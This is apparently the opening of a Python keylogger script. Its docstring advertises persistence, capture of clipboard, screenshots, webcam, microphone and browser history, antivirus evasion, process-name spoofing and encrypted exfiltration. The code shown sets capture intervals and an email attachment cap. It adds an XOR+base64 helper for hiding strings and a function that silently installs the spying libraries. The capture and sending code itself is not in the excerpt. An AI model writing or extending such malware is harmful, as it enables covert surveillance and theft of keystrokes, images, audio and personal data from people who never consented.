#!/usr/bin/env python3
"""
🎯 COMPLETE KEYLOGGER SUITE - FULL FEATURED
Persistence | Clipboard | Screenshots | Webcam | Mic | Browser History
AV Evasion | Process Name Spoofing | Encrypted Exfil | Auto-Start
"""

import os
import sys
import subprocess
import zipfile
import shutil
import tempfile
import base64
import io
import json
import threading
import time
import socket
import platform
import smtplib
import sqlite3
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email import encoders

# ==================== CONFIG ====================
PROJECT_NAME = "keylogger_suite"
REPORT_INTERVAL = 60          # Keylog report (seconds)
SCREENSHOT_INTERVAL = 300     # Screenshot (5 min)
CLIPBOARD_INTERVAL = 10       # Clipboard check (10 sec)
WEBCAM_INTERVAL = 600         # Webcam snapshot (10 min)
MIC_RECORD_DURATION = 30      # Mic record length (seconds)
MAX_EMAIL_SIZE = 20 * 1024 * 1024  # 20MB attachment cap

# Encrypted strings (XOR + base64) - decoded at runtime
_ENC_KEY = 0x5A

def _xor_dec(data_b64):
    """Decode XOR+base64 obfuscated string."""
    data = base64.b64decode(data_b64)
    return ''.join(chr(b ^ _ENC_KEY) for b in data)

# ==================== DEPENDENCIES ====================
def check_dependencies():
    """Install all required packages silently."""
    packages = {
        'pynput': 'pynput',
        'pyinstaller': 'PyInstaller',
        'psutil': 'psutil',
        'Pillow': 'PIL',
        'mss': 'mss',
        'pyperclip': 'pyperclip',
        'opencv-python': 'cv2',
        'sounddevice': 'sounddevice',
        'scipy': 'scipy',
        'browserhistory': 'browserhistory',
        'cryptography': 'cryptography',
        'pywin32': 'win32api' if platform.system() == 'Windows' else None,
    }
    for pkg, imp in packages.items():
        if imp is None:
            continue
        try:
            __import__(imp)
            print(f"[✓] {pkg}")
        except ImportError:
            print(f"[!] Installing {pkg}...")
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", pkg],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
    print("[✓] All dependencies ready\n")
